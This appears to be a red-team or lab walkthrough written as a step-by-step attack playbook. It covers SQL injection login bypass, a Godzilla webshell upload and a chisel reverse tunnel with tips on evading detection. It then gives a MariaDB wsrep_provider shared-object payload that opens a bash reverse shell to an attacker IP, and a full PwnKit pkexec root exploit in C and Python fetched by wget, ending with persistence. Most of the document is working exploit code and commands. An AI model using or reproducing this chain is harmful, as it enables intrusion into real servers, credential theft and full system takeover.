
# SQL Injection
http://<WEB-Server_IP>/

Username: Admin’
Password: Test

Username: Admin’ – -
Password: Test


## Find number of expected columns
Username: admin' ORDER BY 1 -- -
Username: admin' ORDER BY 2 -- -
Username: admin' ORDER BY 3 -- -
Username: admin' ORDER BY 4 -- -
Username: admin' ORDER BY 5 -- -

At ORDER BY 5, we get a new error, indicating there are 4 columns. These are likely passing the username and password.
' UNION SELECT 'col1', 'col2', 'col3', 'col4' -- -
Try Password: col1, col2, col3, then col4. As one filed is the username and nother is password. we are trying to set the password as colx but we dont know which field it is.

user: ' UNION SELECT 'col1', 'col2', 'col3', 'admin' -- -
pass: col3

go to file upload

# Godzilla Upload

upload gozilla
* webserver must have defender turned off :D


Enumerate the box find the sql ip address maybe some details about it and oh look a username and password.
C:/xampp/htdocs/includes/db_config.php
file of great help use the root guy it's the best!

# Upload chisel
* Note: If using chisel i would suggest reading the confluence pages on it to help mask Blue team detection.
must use socks5

./chisel server -p 5060 --reverse
.\chisel.exe client --max-retry-count 5 192.168.172.132:5060 R:socks
# or
powershell -c "Start-Process -NoNewWindow -FilePath 'C:\xampp\htdocs\uploads\chisel.exe' -ArgumentList 'client 192.168.172.132:5060 R:socks'"

# Pivot to the sql server
kali wants ssl and were to poor for that.

* This account is lowlevel and can not break out of the mysql unless sql is EXTREAMLY misconfigured.
proxychains mysql --skip-ssl -h 192.168.172.135 -u svc_webapp -p
Password1!

* I left this in the db_config.php file as the dev put it there for testing.
proxychains mysql --skip-ssl -h 192.168.172.135 -u root -p
SQLwebtest1!
* Enumerate the sql server


# Break out of sql and get a shell

kali>
nano payload.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

static void __attribute__((constructor)) initialize() {
    pid_t pid = fork();
    if (pid == 0) {
        // Child process: Redirect standard streams to a socket
        // This is a reliable, lightweight pure-C reverse shell
        system("bash -c 'bash -i >& /dev/tcp/192.168.172.132/4444 0>&1'");
        exit(0);
    }
    // Parent process returns immediately to MariaDB, preventing service hang
}

kali> gcc -Wall -fPIC -shared -o payload.so payload.c

kali> nc -lvnp 4444

* This was the esiest way to upload the payload.so file as the contents tend to break the clipboard in kali.
kali> proxychains mysql --skip-ssl -h 192.168.172.135 -u root -p'SQLwebtest1!' -e "SELECT 0x$(xxd -p /home/kali/dragon/payload.so | tr -d '\n') INTO DUMPFILE '/tmp/malicious.so';"

kali> proxychains mysql --skip-ssl -h 192.168.172.135 -u root -p'SQLwebtest1!'

* Triger the callback
mysql> SET GLOBAL wsrep_provider='/tmp/malicious.so';

# Reverse shell
bash> whoami
mysql


bash> python3 --version

bash> which pkexec

* Both should and need to be there for the privesc to work.

# Privesc:

find / -perm -4000 -type f 2>/dev/null

1. Create the C code file on your Kali filesystem
kali> cat << 'EOF' > pwnkit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
    setuid(0); setgid(0); seteuid(0); setegid(0);
    system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; exec /bin/sh");
    exit(0);
}
EOF

* Steps two and three have been done and the output is what is in the file pwnkit_base64.txt
2. Pull the official legacy Ubuntu 12.04 image and compile the library inside it
docker run --rm -v "$PWD":/tmp -w /tmp ubuntu:12.04 bash -c "
  sed -i -e 's/archive.ubuntu.com\|security.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list && \
  apt-get update && \
  apt-get install -y gcc && \
  gcc -shared -o pwnkit.so pwnkit.c -fPIC && \
  base64 -w 0 pwnkit.so
"



3. Generate the Base64 string for the Python script
base64 -w 0 pwnkit.so

4.
kali> nano pwnkit.py

#!/usr/bin/env python
import os
import sys
import tempfile
import base64
import shutil
import ctypes

# PASTE THE OUTPUT FROM pwnkit_base64.txt HERE AND KEEP THE QUOTES:
SO_BASE64 = "f0VMRgIBAQAAAAAAAAAAAAIAPgABAA..."

def main():
    tmpdir = tempfile.mkdtemp()

    try:
        os.chdir(tmpdir)

        os.mkdir("GCONV_PATH=.")

        with open("GCONV_PATH=./pwnkit", "w") as f:
            pass
        os.chmod("GCONV_PATH=./pwnkit", int("0755", 8))

        os.mkdir("pwnkit")

        try:
            with open("pwnkit/pwnkit.so", "wb") as f:
                f.write(base64.b64decode(SO_BASE64))
        except Exception as e:
            print("[-] Failed to write payload: " + str(e))
            sys.exit(1)

        with open("pwnkit/gconv-modules", "w") as f:
            f.write("module UTF-8// PWNKIT// pwnkit 2\n")

        envp = [
            b"pwnkit",
            b"PATH=GCONV_PATH=.",
            b"CHARSET=PWNKIT",
            b"SHELL=pwnkit",
            None
        ]

        c_envp = (ctypes.c_char_p * len(envp))()
        for i, env_str in enumerate(envp):
            if env_str is not None:
                c_envp[i] = ctypes.c_char_p(env_str)
            else:
                c_envp[i] = None

        argv = [None]
        c_argv = (ctypes.c_char_p * len(argv))()
        c_argv[0] = None

        libc = ctypes.CDLL(None)
        libc.execve(b"/usr/bin/pkexec", c_argv, c_envp)

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

if __name__ == "__main__":
    main()




python3 -c 'import pty; pty.spawn("/bin/bash")'

bash> cd /tmp
bash> wget http://<kali-or-redirector_IP>:8000/pwnkit.py

python3 pwnkit.py

# Do what you want your root
* Upload CoCa, persistance, etc...


